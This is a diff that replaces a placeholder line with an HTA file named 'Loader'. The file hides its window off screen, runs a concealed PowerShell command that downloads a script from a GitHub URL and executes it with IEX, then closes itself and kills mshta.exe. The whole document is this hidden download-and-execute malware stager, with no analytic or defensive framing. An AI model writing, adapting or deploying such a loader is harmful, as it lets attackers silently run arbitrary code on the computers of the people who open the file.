@@ -1,1 +1,21 @@
-Nothing here
+<html>
+<head>
+    <hta:application id="htaApp" applicationname="Loader"b order="none" caption="no" showintaskbar="no" scroll="no" singleinstance="yes" windowstate="minimize"/>
+    <script type="text/javascript">
+        try {
+            moveTo(-10000, -10000);
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anything678/nothing/refs/heads/main/data')");
+            setTimeout(function() {
+                self.close(); 
+                shell.Run("taskkill /IM mshta.exe /F", 0, false);
+            }, 5000);
+
+        } catch (e) {
+            //alert("Error: " + e.message);
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
